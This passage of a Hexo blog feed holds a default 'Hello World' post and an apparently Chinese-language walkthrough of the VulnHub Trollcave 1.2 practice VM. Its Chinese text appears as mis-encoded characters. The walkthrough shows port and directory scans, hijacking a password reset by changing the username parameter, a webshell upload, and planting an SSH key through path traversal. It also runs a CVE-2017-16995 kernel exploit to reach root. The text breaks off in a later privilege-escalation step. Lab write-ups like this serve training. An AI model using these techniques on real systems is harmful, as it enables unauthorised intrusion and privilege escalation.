        <content type="html"><![CDATA[<hr><h2 id="title-Hello-World"><a href="#title-Hello-World" class="headerlink" title="title: Hello World"></a>title: Hello World</h2><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>trollcave-v1-2</title>
      <link href="/bilibiliganb.github.io/2023/10/19/trollcave-v1-2/"/>
      <url>/bilibiliganb.github.io/2023/10/19/trollcave-v1-2/</url>
      
        <content type="html"><![CDATA[<h1 id="trollcave-v1-2"><a href="#trollcave-v1-2" class="headerlink" title="trollcave-v1-2"></a>trollcave-v1-2</h1><p>é¶æœºåœ°å€<a href="https://www.vulnhub.com/entry/trollcave-12,230/">Trollcave: 1.2 ~ VulnHub</a></p><p>ç›®æ ‡ä¸º rootç”¨æˆ·çš„<strong>flag.txt</strong></p><h2 id="é¶æœºé…ç½®"><a href="#é¶æœºé…ç½®" class="headerlink" title="é¶æœºé…ç½®"></a>é¶æœºé…ç½®</h2><p>é¶æœºç½‘å¡é…ç½®å‚è€ƒæˆ‘ä¹‹å‰çš„<a href="https://blog.csdn.net/witwitwiter/article/details/119889384?spm=1001.2014.3001.5501">Os-hackNos-1_witwitwiterçš„åšå®¢-CSDNåšå®¢</a></p><h2 id="æ¸—é€æµ‹è¯•"><a href="#æ¸—é€æµ‹è¯•" class="headerlink" title="æ¸—é€æµ‹è¯•"></a>æ¸—é€æµ‹è¯•</h2><p>ä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# nmap -sV 192.168.5.136                                                        </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-30 09:22 CST</span><br><span class="line">Nmap scan report for 192.168.5.136 (192.168.5.136)</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.10.3 (Ubuntu)</span><br><span class="line">MAC Address: 00:0C:29:92:E4:A8 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 12.08 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‘ç°80ç«¯å£</p><p>ç„¶åæ¥ç€ä½¿ç”¨<code>drisearch</code>è¿›è¡Œç›®å½•æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# dirsearch -u &quot;http://192.168.5.136/&quot;</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.1</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877</span><br><span class="line"></span><br><span class="line">Output File: /root/.dirsearch/reports/192.168.5.136/_21-09-02_21-14-34.txt</span><br><span class="line"></span><br><span class="line">Error Log: /root/.dirsearch/logs/errors-21-09-02_21-14-34.log</span><br><span class="line"></span><br><span class="line">Target: http://192.168.5.136/</span><br><span class="line"></span><br><span class="line">[21:14:34] Starting: </span><br><span class="line">[21:14:38] 200 -    2KB - /404                                                                                                                     </span><br><span class="line">[21:14:38] 200 -    2KB - /404.html            </span><br><span class="line">[21:14:38] 200 -    1KB - /500                 </span><br><span class="line">[21:14:42] 302 -   92B  - /admin  -&gt;  http://192.168.5.136/login                                                 </span><br><span class="line">[21:14:42] 302 -   92B  - /admin.aspx  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.jsp  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.conf  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.cgi  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.php  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.js  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.asp  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.cfm  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.dll  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.dat  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.html  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.htm  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.exe  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.ex  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.do  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.old  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.epc  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.mdb  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.passwd  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.py  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.php3  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.pl  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.mvc  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.woa  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.rb  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin/  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.shtml  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin/?/login  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:42] 302 -   92B  - /admin.srf  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:14:49] 302 -   92B  - /comments  -&gt;  http://192.168.5.136/login                                                           </span><br><span class="line">[21:14:51] 200 -    0B  - /favicon.ico                                                        </span><br><span class="line">[21:14:55] 200 -    2KB - /login.jsp                                                                                             </span><br><span class="line">[21:14:55] 200 -    2KB - /login.php</span><br><span class="line">[21:14:55] 200 -    2KB - /login.aspx</span><br><span class="line">[21:14:55] 200 -    2KB - /login</span><br><span class="line">[21:14:55] 200 -    2KB - /login.asp</span><br><span class="line">[21:14:55] 200 -    2KB - /login.html</span><br><span class="line">[21:14:55] 200 -    2KB - /login.cgi</span><br><span class="line">[21:14:55] 200 -    2KB - /login.pl</span><br><span class="line">[21:14:55] 200 -  707B  - /login.js</span><br><span class="line">[21:14:55] 500 -   48B  - /login.json</span><br><span class="line">[21:14:55] 200 -    2KB - /login.py</span><br><span class="line">[21:14:55] 200 -    2KB - /login.rb</span><br><span class="line">[21:14:55] 200 -    2KB - /login.htm               </span><br><span class="line">[21:14:55] 200 -    2KB - /login.shtml              </span><br><span class="line">[21:14:55] 200 -    2KB - /login.srf                        </span><br><span class="line">[21:14:55] 200 -    2KB - /login.wdm%20              </span><br><span class="line">[21:14:55] 200 -    2KB - /login/                     </span><br><span class="line">[21:14:59] 302 -   87B  - /register.html  -&gt;  http://192.168.5.136/                                        </span><br><span class="line">[21:14:59] 302 -   87B  - /register.jsp  -&gt;  http://192.168.5.136/</span><br><span class="line">[21:14:59] 302 -   87B  - /register  -&gt;  http://192.168.5.136/</span><br><span class="line">[21:14:59] 302 -   87B  - /register.js  -&gt;  http://192.168.5.136/                                           </span><br><span class="line">[21:14:59] 302 -   87B  - /register.aspx  -&gt;  http://192.168.5.136/</span><br><span class="line">[21:14:59] 302 -   87B  - /register.php  -&gt;  http://192.168.5.136/</span><br><span class="line">[21:14:59] 302 -   92B  - /reports  -&gt;  http://192.168.5.136/login         </span><br><span class="line">[21:14:59] 200 -  202B  - /robots.txt                             </span><br><span class="line">[21:15:02] 302 -   92B  - /users.js  -&gt;  http://192.168.5.136/login                                                           </span><br><span class="line">[21:15:03] 302 -   92B  - /users.csv  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:15:03] 302 -   92B  - /users.html  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:15:03] 302 -   92B  - /users  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:15:03] 302 -   92B  - /users.aspx  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:15:03] 302 -   92B  - /users.php  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:15:03] 302 -   92B  - /users.ini  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:15:03] 302 -   92B  - /users.jsp  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:15:03] 302 -   92B  - /users.mdb  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:15:03] 302 -   92B  - /users.json  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:15:03] 302 -   92B  - /users.db  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:15:03] 302 -   92B  - /users.sqlite  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:15:03] 302 -   92B  - /users.sql  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:15:03] 302 -   92B  - /users.pwd  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:15:03] 302 -   92B  - /users.log  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:15:03] 302 -   92B  - /users.xls  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:15:03] 302 -   92B  - /users/  -&gt;  http://192.168.5.136/login</span><br><span class="line">[21:15:03] 302 -   92B  - /users.txt  -&gt;  http://192.168.5.136/login</span><br><span class="line">                                                                                                            </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰phpç¯å¢ƒå’Œjspç¯å¢ƒï¼Œé‚£ä¹ˆå°è¯•è®¿é—®login</p><p><img src="/bilibiliganb.github.io/2023/10/19/trollcave-v1-2/image-20230628231357999.png" alt="image-20230628231357999"></p><p>ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œæ—è¾¹å‘ç°äº†æœ€æ–°çš„ç”¨æˆ·ï¼Œä»¥åŠåœ¨çº¿ç”¨æˆ·ï¼Œç‚¹å‡»ç”¨æˆ·å¯ä»¥å‘ç°URLä¸­æœ€åå¤šäº†ä¸€ä¸ªæ•°å­—ï¼Œç‚¹å‡»å‡ æ¬¡åï¼Œå‘ç°æœ€æ–°çš„ç”¨æˆ·æ˜¯17ï¼Œé‚£ä¹ˆå¯ä»¥éå†1~17ï¼Œå¾—åˆ°æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯</p><p><img src="/bilibiliganb.github.io/2023/10/19/trollcave-v1-2/image-20230628231421655.png" alt="image-20230628231421655"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">King:Superadmin</span><br><span class="line">dave:Admin</span><br><span class="line">dragon:Admin</span><br><span class="line">coderguy:Admin</span><br><span class="line">cooldude89:Moderator</span><br><span class="line">Sir:Moderator</span><br><span class="line">Q:Moderator</span><br><span class="line">teflon:Moderator</span><br><span class="line">TheDankMan:Regular member</span><br><span class="line">artemus:Regular member</span><br><span class="line">MrPotatoHead:Regular member</span><br><span class="line">Ian:Regular member</span><br><span class="line">kev:Member</span><br><span class="line">notanother:Member</span><br><span class="line">anybodyhome:Member</span><br><span class="line">onlyme:Member</span><br><span class="line">xer:Member</span><br></pre></td></tr></table></figure><p>å¯ä»¥åˆ°æœ‰ä¸€ä¸ªSuperadminç”¨æˆ·ã€‚</p><p>æŸ¥è¯¢å„ç§èµ„æ–™å¾—åˆ°<code>https://github.com/rails/rails</code></p><p>å®‰è£…çš„æ—¶å€™ä¼šåˆ›å»ºç”¨æˆ· railsï¼Œç½‘ç«™é‡Œè¿˜æœ‰ä¸€ä¸ªé‡ç½®å¯†ç çš„åŠŸèƒ½<code>http://192.168.5.136/password_resets/new</code></p><p>ç›´æ¥é€‰æ‹©é‡ç½®kingç”¨æˆ·ä¼šæŠ¥é”™ï¼Œé€‰æ‹©é‡ç½®xerç”¨æˆ·ä¼šå¾—åˆ°å¦‚ä¸‹é“¾æ¥<code>http://192.168.5.136/password_resets/edit.bdmbrG8YFz37cb8GU-2fgA?name=xer</code></p><p>æˆ‘ä»¬è®¿é—®è¿™ä¸ªé“¾æ¥å³å¯é‡ç½®xerçš„å¯†ç </p><p><img src="/bilibiliganb.github.io/2023/10/19/trollcave-v1-2/image-20230628231500201.png" alt="image-20230628231500201"></p><p>ä½†æˆ‘ä»¬å°è¯•å°†<code>http://192.168.5.136/password_resets/edit.bdmbrG8YFz37cb8GU-2fgA?name=xer</code>æ”¹ä¸º<code>http://192.168.5.136/password_resets/edit.bdmbrG8YFz37cb8GU-2fgA?name=King</code>å°è¯•åˆ©ç”¨é€»è¾‘é”™è¯¯é‡ç½®kingç”¨æˆ·çš„å¯†ç </p><p>å‘ç°å¯ä»¥ç›´æ¥é‡ç½®</p><p>è¿›å…¥ä¹‹åï¼Œåœ¨file managerä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œå‘ç°ä¸èƒ½ä¸Šä¼ ï¼Œåœ¨admin panelä¸­å‘ç°å¯ä»¥å¼€å¯ä¸Šä¼ </p><p><img src="/bilibiliganb.github.io/2023/10/19/trollcave-v1-2/image-20230628231519398.png" alt="image-20230628231519398"></p><p>ç”¨å“¥æ–¯æ‹‰ç”Ÿæˆjspæœ¨é©¬ï¼Œä¸Šä¼ è‡³æœåŠ¡å™¨ï¼Œè®¿é—®åå‘ç°æ²¡æœ‰è§£æ</p><p><img src="/bilibiliganb.github.io/2023/10/19/trollcave-v1-2/image-20230628231533945.png" alt="image-20230628231533945"></p><p>é‚£ä¹ˆå°è¯•ä¸Šä¼ sshç§˜é’¥</p><p>é¦–å…ˆç”Ÿæˆsshç§˜é’¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f rails</span><br><span class="line">mv rails.pub authorized_keys</span><br></pre></td></tr></table></figure><p>å°†ä»–ä¸Šä¼ åˆ°<code>/home/rails/.ssh/</code></p><p>ä¸Šä¼ æ—¶è¦åˆ©ç”¨<code>../../../../../</code>è·³è½¬åˆ°æ ¹ç›®å½•,æ•…ä¸Šä¼ è·¯å¾„ä¸º<code>../../../../../../../home/rails/.ssh/authorized_keys</code></p><p>ç„¶åè¿›è¡Œsshç™»å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv rails id_rsa-rails chmod 600 id_rsa-rails</span><br><span class="line">ssh -i id_rsa-rails rails@192.168.5.136</span><br></pre></td></tr></table></figure><p>è·å–æƒé™åæŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ uname -a</span><br><span class="line">Linux trollcave 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">$ cat /etc/lsb-release</span><br><span class="line">DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=16.04</span><br><span class="line">DISTRIB_CODENAME=xenial</span><br><span class="line">DISTRIB_DESCRIPTION=&quot;Ubuntu 16.04.4 LTS&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="CVE-2017-16995ææƒ"><a href="#CVE-2017-16995ææƒ" class="headerlink" title="CVE-2017-16995ææƒ"></a>CVE-2017-16995ææƒ</h4><p>æœç´¢åˆ°exp<a href="https://www.exploit-db.com/exploits/45010">https://www.exploit-db.com/exploits/45010</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc cve.c -o cve</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ è‡³æœåŠ¡å™¨å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ chmod 777 cve</span><br><span class="line">$ ./cve</span><br><span class="line">[.] </span><br><span class="line">[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)</span><br><span class="line">[.] </span><br><span class="line">[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **</span><br><span class="line">[.] </span><br><span class="line">[*] creating bpf map</span><br><span class="line">[*] sneaking evil bpf past the verifier</span><br><span class="line">[*] creating socketpair()</span><br><span class="line">[*] attaching bpf backdoor to socket</span><br><span class="line">[*] skbuff =&gt; ffff88002b580900</span><br><span class="line">[*] Leaking sock struct from ffff880028f0e000</span><br><span class="line">[*] Sock-&gt;sk_rcvtimeo at offset 472</span><br><span class="line">[*] Cred structure at ffff88002f01b900</span><br><span class="line">[*] UID from cred structure: 1001, matches the current: 1001</span><br><span class="line">[*] hammering cred structure at ffff88002f01b900</span><br><span class="line">[*] credentials patched, launching shell...</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(rails)</span><br><span class="line"># cat /root/flag.txt</span><br><span class="line">et tu, dragon?</span><br><span class="line"></span><br><span class="line">c0db34ce8adaa7c07d064cc1697e3d7cb8aec9d5a0c4809d5a0c4809b6be23044d15379c5</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨suidææƒ"><a href="#åˆ©ç”¨suidææƒ" class="headerlink" title="åˆ©ç”¨suidææƒ"></a>åˆ©ç”¨suidææƒ</h4><p>é¦–å…ˆåˆ‡æ¢ä¸ºbashï¼Œç„¶åä½¿ç”¨<code>netstat -natpl</code>æŸ¥çœ‹ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">rails@trollcave:~$ netstat -natpl</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      1065/ruby2.3    </span><br><span class="line">tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 127.0.0.1:55716         127.0.0.1:80            ESTABLISHED 1450/ruby       </span><br><span class="line">tcp        0      0 127.0.0.1:55714         127.0.0.1:80            TIME_WAIT   -               </span><br><span class="line">tcp        0      0 127.0.0.1:55744         127.0.0.1:80            TIME_WAIT   -               </span><br><span class="line">tcp        0      0 127.0.0.1:55728         127.0.0.1:80            TIME_WAIT   -               </span><br><span class="line">tcp        0      0 127.0.0.1:3000          127.0.0.1:55960         TIME_WAIT   -               </span><br><span class="line">tcp        0      0 127.0.0.1:55720         127.0.0.1:80            TIME_WAIT   -               </span><br><span class="line">tcp        0      0 127.0.0.1:3000          127.0.0.1:55950         TIME_WAIT   -               </span><br><span class="line">tcp        0      0 127.0.0.1:55724         127.0.0.1:80            TIME_WAIT   -               </span><br><span class="line">tcp        0      0 192.168.5.136:60830     91.189.91.38:80         ESTABLISHED -               </span><br><span class="line">tcp        0      0 127.0.0.1:55958         127.0.0.1:3000          TIME_WAIT   -               </span><br><span class="line">tcp        0      0 127.0.0.1:3000          127.0.0.1:55946         TIME_WAIT   -               </span><br><span class="line">tcp        0      0 127.0.0.1:55962         127.0.0.1:3000          TIME_WAIT   -               </span><br><span class="line">tcp        0      0 192.168.5.136:22        192.168.5.129:45382     ESTABLISHED -               </span><br><span class="line">tcp        0      0 127.0.0.1:55968         127.0.0.1:3000          TIME_WAIT   -               </span><br><span class="line">tcp        0      0 127.0.0.1:55954         127.0.0.1:3000          TIME_WAIT   -               </span><br><span class="line">tcp        0      0 127.0.0.1:55682         127.0.0.1:80            TIME_WAIT   -               </span><br><span class="line">tcp        0      0 192.168.5.136:58824     91.189.91.38:80         CLOSE_WAIT  -               </span><br><span class="line">tcp        0      0 127.0.0.1:3000          127.0.0.1:55974         TIME_WAIT   -               </span><br><span class="line">tcp        0      0 127.0.0.1:55738         127.0.0.1:80            TIME_WAIT   -               </span><br><span class="line">tcp        0      0 127.0.0.1:80            127.0.0.1:55716         ESTABLISHED -               </span><br><span class="line">tcp        0      0 127.0.0.1:55964         127.0.0.1:3000          TIME_WAIT   -               </span><br><span class="line">tcp        0      0 127.0.0.1:55970         127.0.0.1:3000          TIME_WAIT   -               </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 ::1:5432                :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 ::1:50978               ::1:5432                ESTABLISHED 1065/ruby2.3    </span><br><span class="line">tcp6       0      0 ::1:51680               ::1:5432                ESTABLISHED 1065/ruby2.3    </span><br><span class="line">tcp6       0      0 ::1:5432                ::1:51680               ESTABLISHED -               </span><br><span class="line">tcp6       0      0 ::1:51666               ::1:5432                ESTABLISHED 1065/ruby2.3    </span><br><span class="line">tcp6       0      0 ::1:51678               ::1:5432                ESTABLISHED 1065/ruby2.3    </span><br><span class="line">tcp6       0      0 ::1:51682               ::1:5432                ESTABLISHED 1065/ruby2.3    </span><br><span class="line">tcp6       0      0 ::1:5432                ::1:51682               ESTABLISHED -               </span><br><span class="line">tcp6       0      0 ::1:5432                ::1:51666               ESTABLISHED -               </span><br><span class="line">tcp6       0      0 ::1:5432                ::1:51678               ESTABLISHED -               </span><br><span class="line">tcp6       0      0 ::1:5432                ::1:50978               ESTABLISHED - </span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>Shift + ~ +C</code>åˆ‡æ¢åˆ°sshï¼Œç„¶åä½¿ç”¨<code>-L 8888:LOCALHOST:8888</code>å°†8888ç«¯å£è½¬å‘è‡³æœ¬åœ°</p><p><img src="/bilibiliganb.github.io/2023/10/19/trollcave-v1-2/image-20230628231554695.png" alt="image-20230628231554695"></p><p>ä½¿ç”¨<code> find / -name calc -print 2&gt;&amp;1| grep -v &quot;Permission denied&quot;</code>æŸ¥æ‰¾calc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rails@trollcave:~$ find / -name calc -print 2&gt;&amp;1| grep -v &quot;Permission denied&quot;</span><br><span 